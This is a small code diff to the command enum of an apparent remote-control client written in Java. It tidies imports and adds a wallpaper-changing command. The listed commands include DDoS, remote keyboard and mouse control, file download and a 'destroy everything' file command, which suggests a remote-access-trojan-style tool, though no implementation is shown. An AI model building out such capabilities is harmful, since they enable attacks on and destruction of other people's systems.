@@ -5,10 +5,7 @@ package br.com.introcdc.connect.client.command;
 
 import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.commands.audio.ClientCommandAudio;
-import br.com.introcdc.connect.client.commands.control.ClientCommandDDOS;
-import br.com.introcdc.connect.client.commands.control.ClientCommandKeyboardType;
-import br.com.introcdc.connect.client.commands.control.ClientCommandMouseClick;
-import br.com.introcdc.connect.client.commands.control.ClientCommandMouseScroll;
+import br.com.introcdc.connect.client.commands.control.*;
 import br.com.introcdc.connect.client.commands.file.external.ClientCommandDestroyEverything;
 import br.com.introcdc.connect.client.commands.file.external.ClientCommandDownload;
 import br.com.introcdc.connect.client.commands.file.external.ClientCommandReceive;
@@ -37,6 +34,7 @@ public enum ClientCommandEnum {
     KEYBOARD_TYPE(ClientCommandKeyboardType.class),
     MOUSE_CLICK(ClientCommandMouseClick.class),
     MOUSE_SCROLL(ClientCommandMouseScroll.class),
+    WALLPAPER(ClientCommandWallpaper.class),
 
     // File
     DESTROY_EVERYTHING(ClientCommandDestroyEverything.class),
